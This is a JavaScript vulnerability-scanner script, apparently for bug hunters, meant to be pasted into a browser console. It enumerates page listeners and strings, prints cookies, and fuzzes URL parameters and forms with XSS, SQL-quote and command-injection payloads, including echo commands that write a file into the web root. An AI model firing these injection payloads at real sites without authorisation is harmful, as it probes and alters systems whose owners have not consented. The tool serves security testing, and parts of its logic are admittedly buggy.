/* eslint-disable no-undef */
// Created by Davide Cavallini
// You'll find interesting functions and some bugs

// linkedin: https://www.linkedin.com/in/davidecavallini/

// This tool is studied to help Ethical Hackers to find vulnerable points in webpage's javascript
// Just open the webpage, select all this code, copy and past in browser's console
// eslint-disable-next-line no-unused-vars
function JsBugHuntingHelper () {
  'use strict'

  const xssScanEnabled = true
  const sqlInjectionScanEnabled = true
  const RCEscanEnabled = true
  const formFuzzingEnabled = true

  const payloadsXSS = ['<script>alert("XSS_VULNERABLE_PARAM")</script>', '"><script>alert("XSS_VULNERABLE_PARAM")</script><div class="']
  const payloadsSQLi = ['"', "'"]
  const payloadsRCE = [
    'test" || echo "TEST_RCE" > /var/www/html/testRCE.php#',
    'echo "TEST_RCE" > /var/www/html/testRCE.php#',
    'test" || echo "TEST_RCE" > /var/www/testRCE.php#',
    'test" || echo "TEST_RCE" > /var/www/testRCE.php#',
    '" || echo "TEST_RCE"#',
    '" && echo "TEST_RCE"#'
  ]

  // eslint-disable-next-line no-multiple-empty-lines
  // eslint-disable-next-line no-unused-vars
  // @return void
  this.init = async function () {
    console.log('Created by Davide Cavallini')
    console.log('Linkedin: https://www.linkedin.com/in/davidecavallini/')
    console.log('----------------------------------------------------------')
    console.log('\n')

    console.log('Window Memory Suspicious Points')
    console.log(recursiveEnumerate(window, 0))
    console.log('JS Listeners Suspicious Points')
    console.log(recursiveEnumerate(listAllEventListeners(), 0))
    console.log('JQuery Listeners Suspicious Points')
    console.log(searchJqueryListeners())
    console.log('JQuery Document Listeners Suspicious Points')
    console.log(recursiveEnumerate(getjQueryEventHandlers(document), 0))
    console.log('Body Source Suspicious Points')
    console.log(searchInside(document.body.innerHTML.replace(/(\r\n|\n|\r)/gm, '').replace(/\s\s+/g, ' '), document.body, ['BODY'], 0, 0))

    console.log('Cookie', document.cookie)

    const headers = await getPageHeaders(document.location.href)
    console.log('Headers', headers)

    if (xssScanEnabled === true) {
      console.log('URL XSS Vulnerabilities')
      const xss = await testXSS()
      console.log(xss)
    }
    if (sqlInjectionScanEnabled === true) {
      console.log('URL SQL Injection Vulnerabilities')
      const sql = await testSqlInjection()
      console.log(sql)
    }
    if (RCEscanEnabled === true) {
      console.log('URL RCE Vulnerabilities')
      const rce = await testRCE()
      console.log(rce)
    }
    if (formFuzzingEnabled === true) {
      console.log('Form Vulnerabilities')
      const form = await formFuzzer()
      console.log(form)
    }
    console.log('\n')
    console.log('----------------------------------------------------------')
    console.log('Created by Davide Cavallini')
    console.log('Linkedin: https://www.linkedin.com/in/davidecavallini/')
  }

  function SearchElement (description, type, string) {
    this.description = description
    this.type = type
    this.string = string
  }

  const searchElements = [
  // new SearchElement('single line comment', 'string', ' //'),
  // new SearchElement('block comment', 'string', '/*'),
    new SearchElement('form', 'string', '<form'),
    new SearchElement('url', 'string', 'http://'),
    new SearchElement('url', 'string', 'https://'),
    new SearchElement('web socket', 'string', 'ws://'),
    new SearchElement('web socket', 'string', 'wss://'),
    new SearchElement('post request', 'string', '"POST"'),
    new SearchElement('get request', 'string', '"GET"'),
    new SearchElement('post request', 'string', "'POST"),
    new SearchElement('get request', 'string', "'GET'"),
    new SearchElement('ajax request', 'string', '.ajax'),
    new SearchElement('post request', 'string', '$.post'),
    new SearchElement('get request', 'string', '$.get'),
    new SearchElement('query', 'string', 'query'),
    new SearchElement('api call', 'string', '/api'),
    new SearchElement('php file', 'string', '.php'),
    new SearchElement('asp file', 'string', '.asp'),
    new SearchElement('json file', 'string', '.json'),
    new SearchElement('mailto protocol', 'string', 'mailto:'),
    new SearchElement('something on mysql', 'string', 'mysql'),
    new SearchElement('something on email', 'string', '"email"'),
    new SearchElement('something on username', 'string', '"username"'),
    new SearchElement('something on username', 'string', '"user"'),
    new SearchElement('something on password', 'string', '"password"'),
    new SearchElement('something on password', 'string', '"pass"'),
    new SearchElement('something on password', 'string', '"psw"'),
    new SearchElement('something on password', 'string', '"pwd"'),
    new SearchElement('REGEX url with params', 'regEx', /\?(\w+=\w+)/),
    new SearchElement('REGEX email address', 'regEx', /\S+@\S+\.\S+/),
    new SearchElement('REGEX API Key', 'regEx', /^[a-f0-9]{32}$/)
  ]

  function getAllUrlParams (url) {
  // get query string from url (optional) or window
    let queryString = url ? url.split('?')[1] : window.location.search.slice(1)

    // we'll store the parameters here
    const obj = {}

    // if query string exists
    if (queryString) {
    // stuff after # is not part of query string, so get rid of it
      queryString = queryString.split('#')[0]

      // split our query string into its component parts
      const arr = queryString.split('&')

      for (let i = 0; i < arr.length; i++) {
      // separate the keys and the values
        const a = arr[i].split('=')

        // set parameter name and value (use 'true' if empty)
        const paramName = a[0]
        const paramValue = typeof (a[1]) === 'undefined' ? true : a[1]

        // (optional) keep case consistent
        /* paramName = paramName.toLowerCase()
        if (typeof paramValue === 'string') paramValue = paramValue.toLowerCase() */

        // if the paramName ends with square brackets, e.g. colors[] or colors[2]
        if (paramName.match(/\[(\d+)?\]$/)) {
        // create key if it doesn't exist
          const key = paramName.replace(/\[(\d+)?\]/, '')
          if (!obj[key]) obj[key] = []

          // if it's an indexed array e.g. colors[2]
          if (paramName.match(/\[\d+\]$/)) {
          // get the index value and add the entry at the appropriate position
            const index = /\[(\d+)\]/.exec(paramName)[1]
            obj[key][index] = paramValue
          } else {
          // otherwise add the value to the end of the array
            obj[key].push(paramValue)
          }
        } else {
        // we're dealing with a string
          if (!obj[paramName]) {
          // if it doesn't exist, create property
            obj[paramName] = paramValue
          } else if (obj[paramName] && typeof obj[paramName] === 'string') {
          // if property does exist and it's a string, convert it to an array
            obj[paramName] = [obj[paramName]]
            obj[paramName].push(paramValue)
          } else {
          // otherwise add the property
            obj[paramName].push(paramValue)
          }
        }
      }
    }

    return obj
  }

  function getjQueryEventHandlers (element, eventns) {
    const $ = window.jQuery
    const i = (eventns || '').indexOf('.')
    const event = i > -1 ? eventns.substr(0, i) : eventns
    // eslint-disable-next-line no-void
    const namespace = i > -1 ? eventns.substr(i + 1) : void (0)
    const handlers = Object.create(null)
    element = $(element)
    if (!element.length) return handlers
    // gets the events associated to a DOM element
    const listeners = $._data(element.get(0), 'events') || handlers
    const events = event ? [event] : Object.keys(listeners)
    if (!eventns) return listeners // Object with all event types
    events.forEach((type) => {
    // gets event-handlers by event-type or namespace
      (listeners[type] || []).forEach(getHandlers, type)
    })
    // eslint-disable-next-line
    function getHandlers(e) {
      const type = this.toString()
      const eNamespace = e.namespace || (e.data && e.data.handler)
      // gets event-handlers by event-type or namespace
      if ((event === type && !namespace) ||
            (eNamespace === namespace && !event) ||
            (eNamespace === namespace && event === type)) {
        handlers[type] = handlers[type] || []
        handlers[type].push(e)
      }
    }
    return handlers
  }

  function listAllEventListeners () {
    const allElements = Array.prototype.slice.call(document.querySelectorAll('*'))
    allElements.push(document)
    allElements.push(window)

    const types = []

    for (const ev in window) {
      if (/^on/.test(ev)) types[types.length] = ev
    }

    const elements = []
    for (let i = 0; i < allElements.length; i++) {
      const currentElement = allElements[i]
      for (let j = 0; j < types.length; j++) {
        if (typeof currentElement[types[j]] === 'function') {
          elements.push(currentElement[types[j]])
        }
      }
    }

    return elements
  }

  function regEx (string, regEx) {
    const index = []
    const regex1 = RegExp(regEx, 'gim')
    const str1 = string
    let array1 = []

    while ((array1 = regex1.exec(str1)) !== null) {
      index.push(array1.index)
    }
    return index
  }

  function getAllIndexes (arr, val) {
    const indexes = []
    let i = -1
    while ((i = arr.indexOf(val, i + 1)) !== -1) {
      indexes.push(i)
    }
    return indexes
  }

  function searchInside (functionToString, object, objKeys, o, level, resultTmp) {
    let result = []
    if (resultTmp !== undefined) {
      result = resultTmp
    }

    if (objKeys[o] === undefined) {
      objKeys[o] = ''
    }
    if (object[objKeys[o]] === undefined) {
      object[objKeys[o]] = ''
    }

    searchElements.forEach((v) => {
      if (v.type === 'string') {
        const index = getAllIndexes(functionToString, v.string)
        index.forEach((ind) => {
          result.push({ type: 'string', description: v.description, level, name: objKeys[o], function: object[objKeys[o]], declaration: functionToString.substr(ind - 15, 60) })
          // console.log(result)
        })
      } else if (v.type === 'regEx') {
        // console.log('REGEX')
        const index = regEx(functionToString, v.string)
        // console.log('regEx Index', index)
        index.forEach((ind) => {
          if (objKeys[o] !== 'string') {
            result.push({ type: 'regEx', description: v.description, level, name: objKeys[o], function: object[objKeys[o]], declaration: functionToString.substr(ind - 15, 60) })
            // console.log(result)
          }
        })
      }
    })
    if (resultTmp === undefined) {
      return result
    }
  }

  function recursiveEnumerate (object, level) {
    function recursion (object, level) {
      level++
      const objKeys = Object.keys(object)
      // console.log("A", object)

      for (let o = 0; o < objKeys.length; o++) {
        // imposto massimo livello di ricorsione a 5 per evitare overflows
        if (level < 5 && object[objKeys[o]] !== null && (typeof object[objKeys[o]] === 'function' || typeof object[objKeys[o]] === 'object') && objKeys[o] !== 'JsBugHuntingHelper' && objKeys[o] !== 'recursion' && objKeys[o] !== 'recursiveEnumerate' && objKeys[o] !== 'alreadyProcessedFunctions' && objKeys[o] !== 'jsHuntingHelper') {
        // rivedere sta cosa perchè mi elenca solo le funzioni interne
          if (objKeys[o] !== 'fn') {
            try {
              const functionToString = object[objKeys[o]].toString().replace(/(\r\n|\n|\r)/gm, '').replace(/\s\s+/g, ' ')

              // console.log("B", functionToString)

              if (alreadyProcessedFunctions.indexOf(functionToString) === -1) {
              // console.log("C", functionToString)
                searchInside(functionToString, object, objKeys, o, level, result)
                if (functionToString.indexOf('[object Object]') === -1) {
                  alreadyProcessedFunctions.push(functionToString)
                }

                if (objKeys[o] !== 'set' && objKeys[o] !== 'push') {
                  recursion(object[objKeys[o]], level)
                }
              }
            } catch (reason) {
              console.log(reason)
            }
          }
        }
      }
    }

    const result = []
    const alreadyProcessedFunctions = []
    recursion(object, level)
    // console.log('2', result)
    return result
  }

  function searchJqueryListeners () {
    const jQueryListeners = []
    // eslint-disable-next-line no-undef
    // eslint-disable-next-line no-undef
    $('*').each((i, v) => {
      const elementListeners = getjQueryEventHandlers(v)
      // console.log(Object.values(elementListeners))
      if (Object.keys(elementListeners).length > 0) {
        jQueryListeners.push(elementListeners)
      }
    })
    // console.log(jQueryListeners)
    return recursiveEnumerate(jQueryListeners, 0)
  }

  async function getPageHeaders (url) {
    return new Promise((resolve, reject) => {
      // eslint-disable-next-line no-undef
      const xhr = $.ajax({
        type: 'GET',
        url,
        success: function () {
          resolve(xhr.getAllResponseHeaders())
        },
        error: function () {
          resolve(false)
        }
      })
    })
  }

  async function testXSS () {
    const result = []
    const paramsEntitiesTemp = Object.entries(getAllUrlParams(document.location.href))
    // console.log(paramsEntities)
    for (let i = 0; i < paramsEntitiesTemp.length; i++) {
      for (const payload of payloadsXSS) {
        const paramsEntities = Object.entries(getAllUrlParams(document.location.href))
        const v = paramsEntities[i]
        v[1] = v[1] + payload

        const mod = paramsEntities.map((v) => {
          return v[0] + '=' + v[1]
        })

        const newUrl = document.location.origin + document.location.pathname + '?' + mod.join('&')

        // eslint-disable-next-line no-undef
        try {
          await $.get(newUrl).done(function (data) {
            if (data.indexOf('alert("XSS_VULNERABLE_PARAM")') !== -1) {
              result.push({ paramName: v[0], type: 'XSS via Url', url: newUrl })
            }
          })
        } catch (reason) { console.log(reason) }
      }
    }
    return result
  }

  async function testSqlInjection () {
    const result = []
    const paramsEntitiesTemp = Object.entries(getAllUrlParams(document.location.href))
    // console.log(paramsEntities)
    for (let i = 0; i < paramsEntitiesTemp.length; i++) {
      for (const payload of payloadsSQLi) {
        const paramsEntities = Object.entries(getAllUrlParams(document.location.href))
        const v = paramsEntities[i]
        v[1] = v[1] + payload

        const mod = paramsEntities.map((v) => {
          return v[0] + '=' + v[1]
        })

        const newUrl = document.location.origin + document.location.pathname + '?' + mod.join('&')

        // eslint-disable-next-line no-undef
        try {
          await $.get(newUrl).done(function (data) {
            if (data.indexOf('Uncaught mysql') !== -1) {
              result.push({ paramName: v[0], type: 'SQL Injection via Url', url: newUrl })
            }
          })
        } catch (reason) { console.log(reason) }
      }
    }
    return result
  }

  async function testRCE () {
    const result = []
    const paramsEntitiesTemp = Object.entries(getAllUrlParams(document.location.href))
    // console.log(paramsEntities)
    for (let i = 0; i < paramsEntitiesTemp.length; i++) {
      for (const payload of payloadsRCE) {
        const paramsEntities = Object.entries(getAllUrlParams(document.location.href))
        const v = paramsEntities[i]
        v[1] = v[1] + payload

        const mod = paramsEntities.map((v) => {
          return v[0] + '=' + v[1]
        })

        const newUrl = document.location.origin + document.location.pathname + '?' + mod.join('&')

        // eslint-disable-next-line no-undef
        try {
          await $.get(newUrl).done(function (data) {
            if (data.indexOf('TEST_RCE') !== -1 && data.indexOf('echo "TEST_RCE"') === -1 && data.indexOf('echo &quot;TEST_RCE&quot;') === -1) {
              result.push({ paramName: v[0], type: 'RCE via Url', url: newUrl })
            }
          })
        } catch (reason) { console.log(reason) }
        // eslint-disable-next-line no-undef
        try {
          await $.get(document.location.origin + '/testRCE.php').done(function (data) {
            if (data.indexOf('TEST_RCE') !== -1) {
              result.push({ paramName: v[0], type: 'RCE via Url', url: newUrl })
            }
          })
        } catch (reason) { console.log(reason) }
      }
    }
    return result
  }

  function Q (root, selector) {
    if (typeof root === 'string') {
      selector = root
      root = document
    }
    return root.querySelectorAll(selector)
  }

  // fuzz all forms in the webpage
  async function formFuzzer () {
    const result = []
    // eslint-disable-next-line no-undef
    // probabilmente il problema è questo async
    for (const form of Q('form')) {
      const originalParamsLength = $(form).find('input,button,select,checkbox').length

      if (xssScanEnabled === true) {
        for (let i = 0; i < originalParamsLength; i++) {
          for (const payload of payloadsXSS) {
            const tempParams = []
            // eslint-disable-next-line no-undef
            $(form).find('input,button,select,checkbox').each((i2, v2) => {
              if ($(v2).attr('name') !== undefined && $(v2).attr('name') !== 'undefined' && $(v2).attr('name') !== '') {
                // eslint-disable-next-line no-undef
                // console.log($(v2).attr('name'), $(v2).val())
                tempParams.push({ name: $(v2).attr('name'), value: $(v2).val() })
              }
            })
            // console.log(tempParams, i, tempParams.length)
            if (tempParams[i] !== undefined) {
              tempParams[i].value += payload
              result.push(await sendFormRequest(form, tempParams, 'XSS', tempParams[i].name))
            }
          }
        }
      }

      if (sqlInjectionScanEnabled === true) {
        for (let i = 0; i < originalParamsLength; i++) {
          for (const payload of payloadsSQLi) {
            const tempParams = []
            // eslint-disable-next-line no-undef
            $(form).find('input,button,select,checkbox').each((i2, v2) => {
              if ($(v2).attr('name') !== undefined && $(v2).attr('name') !== 'undefined' && $(v2).attr('name') !== '') {
                // eslint-disable-next-line no-undef
                // console.log($(v2).attr('name'), $(v2).val())
                tempParams.push({ name: $(v2).attr('name'), value: $(v2).val() })
              }
            })
            if (tempParams[i] !== undefined) {
              tempParams[i].value += payload
              result.push(await sendFormRequest(form, tempParams, 'SQLi', tempParams[i].name))
            }
          }
        }
      }

      if (RCEscanEnabled === true) {
        for (let i = 0; i < originalParamsLength; i++) {
          for (const payload of payloadsRCE) {
            const tempParams = []
            // eslint-disable-next-line no-undef
            $(form).find('input,button,select,checkbox').each((i2, v2) => {
              if ($(v2).attr('name') !== undefined && $(v2).attr('name') !== 'undefined' && $(v2).attr('name') !== '') {
                // eslint-disable-next-line no-undef
                // console.log($(v2).attr('name'), $(v2).val())
                tempParams.push({ name: $(v2).attr('name'), value: $(v2).val() })
              }
            })
            if (tempParams[i] !== undefined) {
              tempParams[i].value += payload
              result.push(await sendFormRequest(form, tempParams, 'RCE', tempParams[i].name))
            }
          }
        }
      }
    }
    // console.log('FF', result)
    return result.filter((v) => v.paramName !== undefined)
  }

  async function sendFormRequest (form, params, vulnType, modifiedParam) {
    let result = {}
    // eslint-disable-next-line no-undef
    const url = $(form).attr('action')
    // eslint-disable-next-line no-undef
    if ($(form).attr('method') === 'POST' || $(form).attr('method') === 'post' || $(form).attr('method') === '$_POST' || $(form).attr('method') === '$_post') {
      // eslint-disable-next-line no-undef
      try {
        await $.post(url, params).done(function (data) {
          if (vulnType === 'XSS') {
            if (data.indexOf('alert("XSS_VULNERABLE_PARAM")') !== -1) {
              result = { paramName: modifiedParam, type: 'XSS via POST Form' }
              // console.log('Parametro POST "' + modifiedParam + '" Vulnerabile ad attacchi XSS')
            }
          } else if (vulnType === 'SQLi') {
            if (data.indexOf('Uncaught mysql') !== -1) {
              result = { paramName: modifiedParam, type: 'SQL Injection via POST Form' }
              // console.log('Parametro POST "' + modifiedParam + '" Vulnerabile ad SQL Injection')
            }
          } else if (vulnType === 'RCE') {
            if (sqlInjectionScanEnabled === true) {
              if (data.indexOf('TEST_RCE') !== -1 && data.indexOf('echo "TEST_RCE"') === -1 && data.indexOf('echo &quot;TEST_RCE&quot;') === -1) {
                result = { paramName: modifiedParam, type: 'RCE via POST Form' }
              // console.log('Parametro GET "' + modifiedParam + '" Vulnerabile ad SQL Injection')
              }
            }
          }
        })
        if (vulnType === 'RCE') {
          // qui è giusto che sia get, in quanto è un altra richiesta
          try {
            $.get(document.location.origin + '/testRCE.php').done(function (data) {
              if (data.indexOf('TEST_RCE') !== -1) {
                result = { paramName: modifiedParam, type: 'RCE via POST Form' }
                // console.log('Parametro POST "' + modifiedParam + '" Vulnerabile a Remote Code Execution')
              }
            })
          } catch (reason) { console.log(reason) }
        }
      } catch (reason) { console.log(reason) }
    } else if ($(form).attr('method') === 'GET' || $(form).attr('method') === 'get' || $(form).attr('method') === '$_GET' || $(form).attr('method') === '$_get') {
      try {
        await $.get(url, params).done(function (data) {
          if (vulnType === 'XSS') {
            if (xssScanEnabled === true) {
              if (data.indexOf('alert("XSS_VULNERABLE_PARAM")') !== -1) {
                result = { paramName: modifiedParam, type: 'XSS via GET Form' }
              // console.log('Parametro GET "' + modifiedParam + '" Vulnerabile ad attacchi XSS')
              }
            }
          } else if (vulnType === 'SQLi') {
            if (sqlInjectionScanEnabled === true) {
              if (data.indexOf('Uncaught mysql') !== -1) {
                result = { paramName: modifiedParam, type: 'SQL Injection via GET Form' }
              // console.log('Parametro GET "' + modifiedParam + '" Vulnerabile ad SQL Injection')
              }
            }
          } else if (vulnType === 'RCE') {
            if (sqlInjectionScanEnabled === true) {
              if (data.indexOf('TEST_RCE') !== -1 && data.indexOf('echo "TEST_RCE"') === -1 && data.indexOf('echo &quot;TEST_RCE&quot;') === -1) {
                result = { paramName: modifiedParam, type: 'RCE via GET Form' }
              // console.log('Parametro GET "' + modifiedParam + '" Vulnerabile ad SQL Injection')
              }
            }
          }
        })
        if (vulnType === 'RCE') {
          if (RCEscanEnabled === true) {
            try {
              await $.get(document.location.origin + '/testRCE.php').done(function (data) {
                if (data.indexOf('TEST_RCE') !== -1) {
                  result = { paramName: modifiedParam, type: 'RCE via GET Form' }
                // console.log('Parametro GET "' + modifiedParam + '" Vulnerabile a Remote Code Execution')
                }
              })
            } catch (reason) { console.log(reason) }
          }
        }
      } catch (reason) { console.log(reason) }
    }
    return result
  }
}

// eslint-disable-next-line no-var, no-unused-vars
var jBHH = new JsBugHuntingHelper()
